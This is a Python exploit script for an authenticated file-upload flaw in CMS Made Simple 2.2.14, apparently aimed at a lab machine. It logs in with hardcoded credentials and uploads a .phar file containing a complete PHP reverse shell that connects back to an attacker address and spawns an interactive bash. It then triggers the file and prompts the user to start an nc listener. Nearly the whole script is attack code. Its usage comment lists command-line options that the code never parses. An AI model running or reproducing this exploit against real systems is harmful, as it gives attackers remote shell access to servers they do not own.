#!/usr/bin/python3
#-*- coding: utf-8 -*-

# Exploit Title: CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)
# Google Dork: N/A
# Date: 2020-08-31
# Exploit Author: Luis Noriega (@nogagmx)
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: http://s3.amazonaws.com/cmsms/downloads/14793/cmsms-2.2.14-install.zip
# Version: 2.2.14
# Tested on: Linux Ubuntu 18.04.4 LTS
# CVE : N/A

# Usage:
# python3 exploit.py --url http://URL/cmsms/admin/login.php -u admin -p password -lhost LHOST -lport LPORT

from urllib.parse import urlparse
import requests
import argparse
import string
import random
import json
import sys

# ====================================================================== target

URL_LOGIN = 'http://10.10.11.119/admin_cms_panel/admin/login.php'
URL_UPLOAD = 'http://10.10.11.119/admin_cms_panel/admin/moduleinterface.php'

LOGIN_DATA = {'username': 'editor', 'password': 'alpha!@#$%bravo', 'loginsubmit': 'Submit'}

# ===================================================================== payload

IP = '10.10.14.10'
PORT = '9999'
PAYLOAD = '<?php set_time_limit (0); $VERSION = "1.0"; $ip = "{}"; $port = "{}"; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) {{ $pid = pcntl_fork(); if ($pid == -1) {{ printit("ERROR: Cannot fork"); exit(1); }} if ($pid) {{ exit(0); }} if (posix_setsid() == -1) {{ printit("Error: Cannot setsid()"); exit(1); }} $daemon = 1; }} else {{ printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); }} chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) {{ printit("$errstr ($errno)"); exit(1); }} $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) {{ printit("ERROR: Cannot spawn shell"); exit(1); }} stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) {{ if (feof($sock)) {{ printit("ERROR: Shell connection terminated"); break; }} if (feof($pipes[1])) {{ printit("ERROR: Shell process terminated"); break; }} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) {{ if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); }} if (in_array($pipes[1], $read_a)) {{ if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); }} if (in_array($pipes[2], $read_a)) {{ if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); }} }} fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {{  if (!$daemon) {{ print "$string\n"; }} }} ?>'.format(IP, PORT)
FILENAME = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5)) + '.phar'
FILES = {'m1_files[]': (FILENAME, PAYLOAD)}
UPLOAD_DATA = {"mact":"FileManager,m1_,upload,0", "__c":"", "disable_buffer":"1"}

# ===================================================================== exploit

print("[ + ] Connection to the CMS Made Simple Admin Portal located at "+ URL_UPLOAD)
print("[ + ] Using {}:{}".format(LOGIN_DATA['username'], LOGIN_DATA['password']))

try:
	session = requests.session()
	req = session.post(URL_LOGIN, data=LOGIN_DATA)
	UPLOAD_DATA["__c"] = session.cookies["__c"]
	print ("[ + ] {} logged successfully!".format(LOGIN_DATA['username']))
	response = requests.post(URL_UPLOAD, files=FILES, cookies=session.cookies,data=UPLOAD_DATA)
	data = response.json()
	print ("[ + ] {} file uploaded.".format(FILENAME))
	URL_TRIGGER = data[0]['url']
	input("[ ! ] Set up your nc listener <nc -nvlp {}>, then press any to exploit..".format(PORT))
	print ("[ + ] Pwned!!")
	response = requests.get(URL_TRIGGER, cookies=session.cookies)
	print ("[ + ] Bye")
except BaseException as error:
	print ("[ x ] Something went wrong: {}".format(error))
	sys.exit(1)
